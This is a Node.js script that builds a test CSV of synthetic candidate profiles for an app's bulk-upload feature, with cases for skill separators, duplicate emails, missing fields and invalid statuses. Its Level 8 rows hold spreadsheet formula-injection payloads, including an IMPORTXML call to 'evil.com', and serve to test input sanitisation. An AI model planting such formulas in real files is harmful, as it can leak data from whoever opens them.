import { writeFileSync } from 'fs'

const names = ['Aarav Shah','Priya Sharma','Rahul Kumar','Meera Pillai','Arjun Singh',
  'Divya Nair','Karthik Rajan','Sneha Patel','Vikram Rao','Ananya Gupta',
  'Rohan Mehta','Aisha Nambiar','Suresh Babu','Kavya Reddy','Deepak Verma',
  'Pooja Mishra','Sanjay Agarwal','Nisha Jain','Rajesh Iyer','Lakshmi Devi']
const locs = ['Chennai','Bangalore','Mumbai','Delhi','Hyderabad','Pune','Kolkata','Jaipur']
const types = ['Trainer','Consultant','Employee','Speaker','Freelancer','Contractor','Mentor','Other']
const statuses = ['New','Under Review','Shortlisted','Approved','Engaged','Rejected']
const sources = ['LinkedIn','Referral','WhatsApp','Job Portal','Email','Manual']
const skillsets = [
  '"Python,Machine Learning,AI"',
  '"React,TypeScript,Node.js"',
  '"AWS,Kubernetes,Docker"',
  'NLP;BERT;LLMs',
  'Java/Spring Boot/SQL',
  '"Figma,UI/UX,Design Systems"',
  '"Data Science,Tableau,Power BI"',
  'Flutter/Dart/Firebase',
  '"Leadership,Coaching,Agile"',
  '"DevOps,Terraform,Ansible"',
]

const rows = ['name,email,phone,skills,experience,status,source,location,type,notes']

// Level 1: 10 clean happy-path records
for (let i = 0; i < 10; i++) {
  const n = names[i % names.length]
  const e = `${n.toLowerCase().replace(/\s+/g,'.')}.l1.${i}@test.com`
  rows.push([n, e, `987654${String(i).padStart(4,'0')}`, skillsets[i % skillsets.length],
    i + 1, statuses[i % 6], sources[i % 6], locs[i % locs.length], types[i % types.length], `L1 clean record ${i}`].join(','))
}

// Level 2: Skill separator tests
rows.push('Comma Sep,comma.sep@test.com,9000000001,"Python,AI,Cloud",3,New,Manual,Chennai,Trainer,L2 comma separator')
rows.push('Slash Sep,slash.sep@test.com,9000000002,Python/AI/Cloud,3,New,Manual,Mumbai,Trainer,L2 slash separator')
rows.push('Semi Sep,semi.sep@test.com,9000000003,Python;AI;Cloud,3,New,Manual,Delhi,Trainer,L2 semicolon separator')
rows.push('Pipe Sep,pipe.sep@test.com,9000000004,Python|AI|Cloud,3,New,Manual,Pune,Trainer,L2 pipe separator')

// Level 5: Mixed/weird skill separators
rows.push('Mixed Sep,mixed.sep@test.com,9000000005,"Python, AI/ML;Cloud|DevOps",3,New,Manual,Bangalore,Trainer,L5 mixed separators')
rows.push('Ampersand Sep,amp.sep@test.com,9000000006,NLP & LLM,4,New,Manual,Chennai,Consultant,L5 ampersand')

// Level 3: Duplicate detection (email of first clean record)
const dupEmail = `${names[0].toLowerCase().replace(/\s+/g,'.')}.l1.0@test.com`
rows.push(`Duplicate Person,${dupEmail},9000000007,Python,5,New,LinkedIn,Mumbai,Consultant,L3 DUPLICATE EMAIL`)

// Level 4: Missing required fields - should fail gracefully
rows.push(`,missingnameonly@test.com,9000000008,Python,2,New,Manual,Delhi,Trainer,L4 MISSING NAME - should skip`)
rows.push('Has Name Only,,,React,3,New,LinkedIn,Pune,Employee,L4 missing email and phone - valid row')

// Level 7: Invalid status
rows.push('Bad Status,badstatus@test.com,9000000009,Python,4,Super Approved,Manual,Chennai,Trainer,L7 invalid status - should map to New')
rows.push('Empty Status,emptystatus@test.com,9000000010,React,3,,LinkedIn,Bangalore,Employee,L7 empty status - should default to New')

// Level 8: CSV Injection protection
rows.push('"=IMPORTXML(""evil.com"",""//secret"")",injection1@test.com,9000000011,Python,3,New,Manual,Chennai,Trainer,L8 formula injection 1')
rows.push('"+SUM(A1:B1) attack",injection2@test.com,9000000012,React,3,New,Manual,Mumbai,Employee,L8 formula injection 2')
rows.push('"-SUM() formula",injection3@test.com,9000000013,Java,3,New,Manual,Delhi,Consultant,L8 formula injection 3')
rows.push('"@malicious formula",injection4@test.com,9000000014,Go,3,New,Manual,Hyderabad,Trainer,L8 at sign injection')

// Level 6 + Demo showcase: 50 well-structured profiles (10 each type)
const showcaseTypes = [
  ...Array(10).fill('Trainer'),
  ...Array(10).fill('Consultant'),
  ...Array(10).fill('Employee'),
  ...Array(10).fill('Speaker'),
  ...Array(10).fill('Freelancer'),
]
const showcaseSkills = [
  '"Python,Machine Learning,Deep Learning"',
  '"React,Node.js,TypeScript"',
  '"AWS,Azure,Kubernetes"',
  '"NLP,BERT,LLMs,PyTorch"',
  '"Public Speaking,Innovation,Digital Transformation"',
  '"Figma,UI/UX Design,Design Systems"',
  '"Java,Spring Boot,Microservices"',
  '"Data Science,Python,Tableau"',
  '"DevOps,CI/CD,Docker,Terraform"',
  '"Leadership,Coaching,Strategy"',
]
const showcaseStatuses = ['New','New','Under Review','Under Review','Shortlisted','Shortlisted','Approved','Approved','Engaged','Rejected']
const showcaseLocs = ['Chennai','Bangalore','Mumbai','Delhi','Hyderabad']

for (let i = 0; i < 50; i++) {
  const n = `${names[i % names.length]} Demo${i + 1}`
  const e = `${n.toLowerCase().replace(/\s+/g,'.')}.${i}@showcase.com`
  rows.push([
    n, e, `8765${String(430000 + i).padStart(6,'0')}`,
    showcaseSkills[i % showcaseSkills.length],
    Math.floor(i / 5) + 1,
    showcaseStatuses[i % 10],
    sources[i % sources.length],
    showcaseLocs[i % showcaseLocs.length],
    showcaseTypes[i],
    `Showcase profile ${i + 1}`
  ].join(','))
}

writeFileSync('public/test-bulk-upload.csv', rows.join('\n'))
console.log(`Generated public/test-bulk-upload.csv with ${rows.length - 1} records`)
console.log('Breakdown:')
console.log('  - L1: 10 clean happy-path records')
console.log('  - L2: 4 skill separator tests (comma/slash/semicolon/pipe)')
console.log('  - L5: 2 mixed/weird separator tests')
console.log('  - L3: 1 deliberate duplicate email')
console.log('  - L4: 2 missing field tests')
console.log('  - L7: 2 invalid status tests')
console.log('  - L8: 4 CSV injection attempts')
console.log('  - Showcase: 50 typed profiles across 5 cities')
